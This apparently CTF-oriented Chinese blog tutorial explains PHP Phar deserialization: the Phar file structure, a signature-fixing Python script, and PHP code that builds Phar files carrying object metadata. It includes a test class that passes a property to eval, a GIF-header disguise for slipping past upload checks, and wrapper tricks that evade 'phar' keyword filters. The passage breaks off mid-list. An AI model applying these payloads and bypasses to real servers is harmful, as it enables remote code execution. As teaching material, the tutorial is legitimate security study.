{"title":"PHP Phar反序列化浅析","uid":"e6402dc9a02db5ae2c54650aafd17f57","slug":"PHP Phar反序列化浅析","date":"2022-09-14T01:36:20.000Z","updated":"2023-03-20T04:06:34.000Z","comments":true,"path":"api/articles/PHP Phar反序列化浅析.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141530896.png","content":"<h1 id=\"声明\"><a href=\"#声明\" class=\"headerlink\" title=\"声明\"></a>声明</h1><p>文章首发于跳跳糖社区<a href=\"https://tttang.com/archive/1732\">https://tttang.com/archive/1732</a></p>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>Phar反序列化是PHP反序列化的一个重要部分，进行相关学习后，简单总结如下，希望对正在学习的师傅有所帮助。</p>\n<h1 id=\"了解Phar\"><a href=\"#了解Phar\" class=\"headerlink\" title=\"了解Phar\"></a>了解Phar</h1><h2 id=\"Phar含义\"><a href=\"#Phar含义\" class=\"headerlink\" title=\"Phar含义\"></a>Phar含义</h2><p>可以认为Phar是PHP的压缩文档，是PHP中类似于JAR的一种打包文件。它可以把多个文件存放至同一个文件中，无需解压，PHP就可以进行访问并执行内部语句。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>默认开启版本 PHP version &gt;=  5.3</p></blockquote>\n<h2 id=\"Phar文件结构\"><a href=\"#Phar文件结构\" class=\"headerlink\" title=\"Phar文件结构\"></a>Phar文件结构</h2><p>Phar文件结构可大致分为四个部分，官方文档介绍如下图<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205993.png\" alt=\"在这里插入图片描述\"><br>简单来说就是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、Stub<span class=\"token comment\">//Phar文件头</span>\n<span class=\"token number\">2</span>、manifest<span class=\"token comment\">//压缩文件信息</span>\n<span class=\"token number\">3</span>、contents<span class=\"token comment\">//压缩文件内容</span>\n<span class=\"token number\">4</span>、signature<span class=\"token comment\">//签名</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>具体如下</p>\n<h3 id=\"Stub\"><a href=\"#Stub\" class=\"headerlink\" title=\"Stub\"></a>Stub</h3><p>Stub是Phar的文件标识，也可以理解为它就是Phar的文件头<br>这个Stub其实就是一个简单的PHP文件，它的格式具有一定的要求，具体如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">xxx<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> xxx<span class=\"token punctuation\">;</span> <span class=\"token keyword\">__HALT_COMPILER</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这行代码的含义，也就是说前面的内容是不限制的，但在该PHP语句中，必须有<code>__HALT_COMPILER()</code>，没有这个，PHP就无法识别出它是Phar文件。<br>这个其实就类似于图片文件头，比如gif文件没有<code>GIF89A</code>文件头就无法正确的解析图片</p>\n<h3 id=\"manifest\"><a href=\"#manifest\" class=\"headerlink\" title=\"manifest\"></a>manifest</h3><p> <code>a manifest describing the contents</code>，用于存放文件的属性、权限等信息。<br> 这里也是反序列化的攻击点，因为这里以序列化的形式存储了用户自定义的<code>Meta-data</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205018.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"contents\"><a href=\"#contents\" class=\"headerlink\" title=\"contents\"></a>contents</h3><p><code>the file contents</code>，这里用于存放Phar文件的内容</p>\n<h3 id=\"signature\"><a href=\"#signature\" class=\"headerlink\" title=\"signature\"></a>signature</h3><p><code>[optional] a signature for verifying Phar integrity (phar file format only)</code>,签名(可选参数)，位于文件末尾，具体格式如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205075.png\" alt=\"在这里插入图片描述\"><br>从官方文档中不难看出，签证尾部的<code>01</code>代表md5加密，<code>02</code>代表sha1加密，<code>04</code>代表sha256加密，<code>08</code>代表sha512加密<br>简单的举个栗子<br>用010editor打开Phar文件<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205013.png\" alt=\"在这里插入图片描述\"><br>当我们修改文件的内容时，签名就会变得无效，这个时候需要更换一个新的签名<br>更换签名的脚本</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> hashlib <span class=\"token keyword\">import</span> sha1\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test.phar'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span>\n    f <span class=\"token operator\">=</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t\ns <span class=\"token operator\">=</span> f<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">28</span><span class=\"token punctuation\">]</span> <span class=\"token comment\"># 获取要签名的数据</span>\nh <span class=\"token operator\">=</span> f<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token comment\"># 获取签名类型和GBMB标识</span>\nnewf <span class=\"token operator\">=</span> s <span class=\"token operator\">+</span> sha1<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> h <span class=\"token comment\"># 数据 + 签名 + (类型 + GBMB)</span>\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'newtest.phar'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span>\n    <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>newf<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 写入新文件</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"反序列化\"><a href=\"#反序列化\" class=\"headerlink\" title=\"反序列化\"></a>反序列化</h2><h3 id=\"成因\"><a href=\"#成因\" class=\"headerlink\" title=\"成因\"></a>成因</h3><p>Phar之所以能反序列化，是因为Phar文件会以序列化的形式存储用户自定义的<code>meta-data</code>,PHP使用<code>phar_parse_metadata</code>在解析meta数据时，会调用<code>php_var_unserialize</code>进行反序列化操作。具体解析代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword type-declaration\">int</span> <span class=\"token function\">phar_parse_metadata</span><span class=\"token punctuation\">(</span>char <span class=\"token operator\">**</span>buffer<span class=\"token punctuation\">,</span> zval <span class=\"token operator\">*</span>metadata<span class=\"token punctuation\">,</span> uint32_t zip_metadata_len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n    php_unserialize_data_t var_hash<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>zip_metadata_len<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">const</span> unsigned char <span class=\"token operator\">*</span>p<span class=\"token punctuation\">;</span>\n        unsigned char <span class=\"token operator\">*</span>p_buff <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>unsigned char <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">estrndup</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>buffer<span class=\"token punctuation\">,</span> zip_metadata_len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        p <span class=\"token operator\">=</span> p_buff<span class=\"token punctuation\">;</span>\n        <span class=\"token function\">ZVAL_NULL</span><span class=\"token punctuation\">(</span>metadata<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">PHP_VAR_UNSERIALIZE_INIT</span><span class=\"token punctuation\">(</span>var_hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">php_var_unserialize</span><span class=\"token punctuation\">(</span>metadata<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>p<span class=\"token punctuation\">,</span> p <span class=\"token operator\">+</span> zip_metadata_len<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>var_hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">efree</span><span class=\"token punctuation\">(</span>p_buff<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">PHP_VAR_UNSERIALIZE_DESTROY</span><span class=\"token punctuation\">(</span>var_hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">zval_ptr_dtor</span><span class=\"token punctuation\">(</span>metadata<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">ZVAL_UNDEF</span><span class=\"token punctuation\">(</span>metadata<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token constant\">FAILURE</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token function\">efree</span><span class=\"token punctuation\">(</span>p_buff<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">PHP_VAR_UNSERIALIZE_DESTROY</span><span class=\"token punctuation\">(</span>var_hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"demo\"><a href=\"#demo\" class=\"headerlink\" title=\"demo\"></a>demo</h3><h4 id=\"生成Phar文件\"><a href=\"#生成Phar文件\" class=\"headerlink\" title=\"生成Phar文件\"></a>生成Phar文件</h4><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>需要去检查一下php.ini中的phar.readonly选项，如果是On，需要修改为Off。</p></blockquote>\n<p>Phar文件生成的话，可以用如下代码生成</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">test</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"qwq\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" is a web vegetable dog \"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">name</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"quan9i\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$tttang</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">phar</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'tttang.phar'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//后缀名必须为phar</span>\n<span class=\"token variable\">$tttang</span><span class=\"token operator\">-></span><span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//开始缓冲 Phar 写操作</span>\n<span class=\"token variable\">$tttang</span><span class=\"token operator\">-></span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//自定义的meta-data存入manifest</span>\n<span class=\"token variable\">$tttang</span><span class=\"token operator\">-></span><span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;?php __HALT_COMPILER();?>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测</span>\n<span class=\"token variable\">$tttang</span><span class=\"token operator\">-></span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//添加要压缩的文件</span>\n<span class=\"token variable\">$tttang</span><span class=\"token operator\">-></span><span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205046.png\" alt=\"在这里插入图片描述\"><br>该如何触发反序列化呢，一般是配合Phar，此时可以不借助unserialize()直接进行反序列化操作。Phar属于伪协议，伪协议使用较多的是一些文件操作函数，如<code>fopen()</code>、<code>copy()</code>、<code>file_exists()</code>等，具体如下图<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205052.png\" alt=\"在这里插入图片描述\"><br>(图片引用于<a href=\"https://www.freebuf.com/articles/web/305292.html\">https://www.freebuf.com/articles/web/305292.html</a>)</p>\n<h4 id=\"反序列化-1\"><a href=\"#反序列化-1\" class=\"headerlink\" title=\"反序列化\"></a>反序列化</h4><p>前面在描述反序列化成因时提到过，是因为解析Phar文件时对Meta进行了反序列化，接下来本地测试一下，测试是否能成功触发。</p>\n<p>测试代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">test</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$tttang</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'phar://tttang.phar/test.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$tttang</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205879.png\" alt=\"在这里插入图片描述\"><br>test是之前写入test.txt的内容，quan9i是之前在Phar文件中设置的<code>name</code>名</p>\n<h3 id=\"条件\"><a href=\"#条件\" class=\"headerlink\" title=\"条件\"></a>条件</h3><p>利用条件有以下几个</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、phar文件能够上传至服务器 \n<span class=\"token comment\">//即要求存在file_get_contents()、fopen()这种函数</span>\n\n<span class=\"token number\">2</span>、要有可利用的魔术方法\n<span class=\"token comment\">//这个的话用一位大师傅的话说就是利用魔术方法作为\"跳板\"</span>\n\n<span class=\"token number\">3</span>、文件操作函数的参数可控，且<span class=\"token punctuation\">:</span>、<span class=\"token operator\">/</span>、phar等特殊字符没有被过滤\n<span class=\"token comment\">//一般利用姿势是上传Phar文件后通过伪协议Phar来实现反序列化，伪协议Phar格式是`Phar://`这种，如果这几个特殊字符被过滤就无法实现反序列化</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h1 id=\"绕过方式\"><a href=\"#绕过方式\" class=\"headerlink\" title=\"绕过方式\"></a>绕过方式</h1><p>存在漏洞，就会存在防护，通常针对Phar反序列化也是有防范的。这里简单的总结一下常见的绕过方式。</p>\n<h2 id=\"更改文件格式\"><a href=\"#更改文件格式\" class=\"headerlink\" title=\"更改文件格式\"></a>更改文件格式</h2><p>我们利用Phar反序列化的第一步就是需要上传Phar文件到服务器，而如果服务端存在防护，比如这种</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"type\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"image/gif\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>要求文件格式只能为<code>gif</code>，这个时候我们该怎么办呢？<br>这个时候我们需要朝花夕拾，重提一下PHP识别Phar文件的方式。PHP通过<code>Stub</code>里的<code>__HALT_COMPILER();</code>来识别这个文件是Phar文件，对于其他是无限制的，这个时候也就意味着我们即使对文件后缀和文件名进行更改，其实质仍然是Phar文件。<br>示例代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Test</span> <span class=\"token punctuation\">&#123;</span>\n    \t<span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n    \t<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    \t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"I am\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">;</span>\n    \t<span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token variable\">$obj</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$obj</span> <span class=\"token operator\">-></span> <span class=\"token property\">name</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"quan9i\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$phar</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Phar</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test.phar'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$phar</span> <span class=\"token operator\">-></span> <span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//开始缓冲 Phar 写操作</span>\n    <span class=\"token variable\">$phar</span> <span class=\"token operator\">-></span> <span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'GIF89a&lt;?php __HALT_COMPILER();?>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//设置stub，添加gif文件头</span>\n    <span class=\"token variable\">$phar</span> <span class=\"token operator\">-></span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test.txt'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//要压缩的文件</span>\n    <span class=\"token variable\">$phar</span> <span class=\"token operator\">-></span> <span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$obj</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//将自定义meta-data存入manifest</span>\n    <span class=\"token variable\">$phar</span> <span class=\"token operator\">-></span> <span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">////停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>在浏览器上访问此文件生成test.phar文件，用010editor查看<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201206135.png\" alt=\"在这里插入图片描述\"><br>随便找一个分析文件格式的<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201206719.png\" alt=\"在这里插入图片描述\"><br>变成Gif格式，这种上传一般可以绕过大多数上传检测。</p>\n<h2 id=\"绕过Phar关键字检测\"><a href=\"#绕过Phar关键字检测\" class=\"headerlink\" title=\"绕过Phar关键字检测\"></a>绕过Phar关键字检测</h2><p>Phar反序列化中，我们一般思路是上传Phar文件后，通过给参数赋值为<code>Phar://xxx</code>来实现反序列化，而一些防护可能会采取禁止参数开头为Phar等关键字的方式来防止Phar反序列化，示例代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/^php|^file|^phar|^dict|^zip/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>绕过的话，我们的办法是使用各种协议来进行绕过，具体如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.base64-encode/resource=phar://test.phar</span>\n<span class=\"token comment\">//即使用filter伪协议来进行绕过</span>\n<span class=\"token number\">2</span>、compress<span class=\"token operator\">.</span>bzip2<span class=\"token punctuation\">:</span><span class=\"token comment\">//phar:///test.phar/test.txt</span>\n<span class=\"token comment\">//使用bzip2协议来进行绕过</span>\n<span class=\"token number\">3</span>、compress<span class=\"token operator\">.</span>zlib<span class=\"token punctuation\">:</span><span class=\"token comment\">//phar:///home/sx/test.phar/test.txt</span>\n<span class=\"token 